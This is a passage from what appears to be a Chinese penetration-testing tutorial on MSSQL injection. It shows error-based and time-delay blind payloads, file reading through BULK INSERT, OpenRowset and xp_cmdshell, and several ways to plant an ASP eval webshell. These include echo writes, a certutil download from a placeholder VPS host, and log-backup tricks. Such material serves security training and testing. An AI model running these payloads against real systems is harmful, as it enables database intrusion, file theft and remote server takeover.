</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入举例-3">注入举例<a href="#注入举例-3" class="hash-link" aria-label="注入举例的直接链接" title="注入举例的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="开启报错">开启报错<a href="#开启报错" class="hash-link" aria-label="开启报错的直接链接" title="开启报错的直接链接">​</a></h4>
<p>有报错的情况下，可直接接报错注入函数来抛出异常，获取我们想要的数据</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">convert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632294837232-1d60d54e-d442-4f68-af3e-467373c9a24a-0ef53d292158494151189f8e452587cf.png" width="1298" height="302" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="关闭报错">关闭报错<a href="#关闭报错" class="hash-link" aria-label="关闭报错的直接链接" title="关闭报错的直接链接">​</a></h4>
<p>无报错的情况下，则考虑使用时间盲注来进行测试</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">order</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">by</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">substring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;m&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">waitfor</span><span class="token plain"> delay </span><span class="token string" style="color:#e3116c">&#x27;0:0:5&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223141436257" src="/assets/images/image-20211223141436257-effe87501f779f71c5ee75bb8a72fe4b.png" width="2066" height="118" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="二次注入">二次注入<a href="#二次注入" class="hash-link" aria-label="二次注入的直接链接" title="二次注入的直接链接">​</a></h2>
<p>同mysql二次注入，不多赘述</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="文件读写">文件读写<a href="#文件读写" class="hash-link" aria-label="文件读写的直接链接" title="文件读写的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概述">概述<a href="#概述" class="hash-link" aria-label="概述的直接链接" title="概述的直接链接">​</a></h3>
<p>MSSQL的文件操作要求要有两大前提：</p>
<ol>
<li>有相应的权限<code>db_owner</code></li>
<li>知道文件的绝对路径</li>
</ol>
<p>在mssql中有两个存储过程可以帮我们来找绝对路径：<code>xp_cmdshell</code>和 <code>xp_dirtree</code></p>
<ul>
<li><strong>利用xp_dirtree方法来寻找</strong></li>
</ul>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&#x27;c:&#x27;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 列出所有c:\文件、目录、子目录 </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&#x27;c:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 只列c:\目录</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&#x27;c:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">-- 列c:\目录、文件</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632303714752-817c955d-e05e-438f-a80f-f788e4f22a3d-21f2ad540afd0917f95a76ceb1791c06.png" width="430" height="628" class="img_ev3q"></p>
<p>当实际利用的时候我们可以创建一个临时表把存储过程查询到的路径插入到临时表中</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> tmp </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dir </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">num </span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">num1 </span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dir</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">num</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">num1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&#x27;c:&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223152205815" src="/assets/images/image-20211223152205815-e7316b9bb9a8862d5db027f14dbcc415.png" width="1938" height="214" class="img_ev3q"></p>
<ul>
<li><strong>使用xp_cmdshell查找绝对路径</strong></li>
</ul>
<p>cmd中寻找某文件</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> /r c:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> %i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">*.asp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">do</span><span class="token plain"> </span><span class="token builtin class-name">echo</span><span class="token plain"> %i</span><br></span></code></pre></div></div>
<p>因此只需要建立一个表存一个<code>varchar</code>字段就可以了</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> tmp </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dir </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_cmdshell </span><span class="token string" style="color:#e3116c">&#x27;for /r c:\ %i in (*.asp) do echo %i&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="读">读<a href="#读" class="hash-link" aria-label="读的直接链接" title="读的直接链接">​</a></h3>
<ol>
<li>读取文件可以创建一个临时表，将本地文件写入该表中（无法远程登录的情况下，使用堆叠注入）</li>
</ol>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 建立一个临时表</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">create</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> testtable</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">context ntext</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 将本地文件写入表中</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">BULK</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">INSERT</span><span class="token plain"> testtable </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;c:/windows/win.ini&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">WITH</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   DATAFILETYPE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;char&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   KEEPNULLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> context </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> testtable</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 删除临时表</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">drop</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> testtable</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223153027804" src="/assets/images/image-20211223153027804-a62a0b6bc37c1261b127dba62b546f83.png" width="1974" height="226" class="img_ev3q"></p>
<ol start="2">
<li>使用<code>OpenRowset()</code>函数直接读文件</li>
</ol>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> x </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">OpenRowset</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">BULK</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;C:\Windows\win.ini&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">SINGLE_CLOB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> R</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">x</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223154724201" src="/assets/images/image-20211223154724201-40493c9dc698d2d3d2882b9b4c92c540.png" width="1948" height="358" class="img_ev3q"></p>
<ol start="2">
<li>使用<code>xp_cmdshell</code>执行dos命令</li>
</ol>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 有回显的情况下可以直接读</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_cmdshell </span><span class="token string" style="color:#e3116c">&#x27;type c:/windows/win.ini&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 也可以先写入到文件再读</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">CREATE</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">TABLE</span><span class="token plain"> tmp </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dir </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dir</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">execute</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_cmdshell </span><span class="token string" style="color:#e3116c">&#x27;type c:/windows/win.ini&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 查询数据</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> tmp</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="写">写<a href="#写" class="hash-link" aria-label="写的直接链接" title="写的直接链接">​</a></h3>
<p>利用<code>xp_cmdshell</code>执行dos命令写文件</p>
<p>在得知绝对路径的情况下，可以使用echo写入webshell，如果需要换行则使用<code>&gt;&gt;</code>追加写入，注意如<code>=</code>、<code>&gt;</code> 等前使用<code>^</code>来转义，也可以使用远程下载的方式来下载webshell</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 直接echo写入</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">exec</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_cmdshell </span><span class="token string" style="color:#e3116c">&#x27;echo ^&lt;%eval request(&quot;cmd&quot;)% ^&gt;&gt; C:\Inetpub\wwwroot\sqlilabs\test.asp&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 远程下载</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">exec</span><span class="token plain"> master</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">xp_cmdshell </span><span class="token string" style="color:#e3116c">&#x27;certutil.exe -urlcache -split -f &quot;&lt;your_vps&gt;&quot; C:\Inetpub\wwwroot\sqlilabs\test.asp&#x27;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="db_owner权限log备份getshell">DB_owner权限LOG备份Getshell<a href="#db_owner权限log备份getshell" class="hash-link" aria-label="DB_owner权限LOG备份Getshell的直接链接" title="DB_owner权限LOG备份Getshell的直接链接">​</a></h3>
<p>无论是LOG备份还是差异备份，都是利用备份的过程中写入一句话木马</p>
<p><strong>SQLServer常见的备份策略：</strong></p>
<ul>
<li>每周一次完整备份</li>
<li>每天一次差异备份</li>
<li>每小时一次事务日志备份</li>
</ul>
<p><strong>利用前提</strong>：</p>
<ul>
<li>目标机器存在数据库备份文件 ，也就是如果我们利用<code>test</code>数据库的话，则需要该test数据库存在数据库备份文件，而且恢复模式得是<em>完整模式</em></li>
<li>知道网站的绝对路径</li>
<li>该注入支持堆叠注入</li>
</ul>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">-- 修改数据库恢复模式为 完整模式</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">alter</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">database</span><span class="token plain"> 数据库名 </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> RECOVERY </span><span class="token keyword" style="color:#00009f">FULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 创建一张表cmd，只有一个列 a，类型为image</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">create</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> cmd </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a image</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 备份表到指定路径</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">backup</span><span class="token plain"> log 数据库名 </span><span class="token keyword" style="color:#00009f">to</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">disk</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;C:\Inetpub\wwwroot\sqlilabs\1.asp&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> init</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 插入一句话到cmd表里，&lt;%eval request(&quot;cmd&quot;)%&gt; 的16进制</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> cmd </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x3c256576616c20726571756573742822636d642229253e</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 把操作日志备份到指定文件</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">backup</span><span class="token plain"> log 数据库名 </span><span class="token keyword" style="color:#00009f">to</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">disk</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;C:\Inetpub\wwwroot\sqlilabs\2.asp&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">-- 删除cmd表</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">drop</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> cmd</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image.png" src="/assets/images/1632309108241-1f043871-1885-4775-8705-d8c295f1aee4-524d188d4dbe897473f27f64e8f16f5d.png" width="594" height="446" class="img_ev3q"></p>
<p>执行完成之后会在目标网站根目录下生成1.asp和2.asp文件，其中1.asp 保存数据库，2.asp就是我们需要连接的木马文件</p>
<p><img decoding="async" loading="lazy" alt="image.png" src="/assets/images/1632309139200-279d101c-3aa4-4b18-bb23-18831d70ed48-8a50f74d470525c7b559c24921f023f1.png" width="593" height="712" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="db_owner权限差异备份getshell">DB_owner权限差异备份Getshell<a href="#db_owner权限差异备份getshell" class="hash-link" aria-label="DB_owner权限差异备份Getshell的直接链接" title="DB_owner权限差异备份Getshell的直接链接">​</a></h3>
<blockquote>
<p>差异备份有概率会把网站搞崩，所以不建议使用差异备份</p>
</blockquote>
<p><strong>利用前提</strong>：</p>
<ul>
<li>知道网站的绝对路径</li>
<li>该注入支持堆叠注入</li>
</ul>
<p><strong>利用语句：</strong></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">create</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">table</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">dbo</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">test</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">cmd</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">image</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> 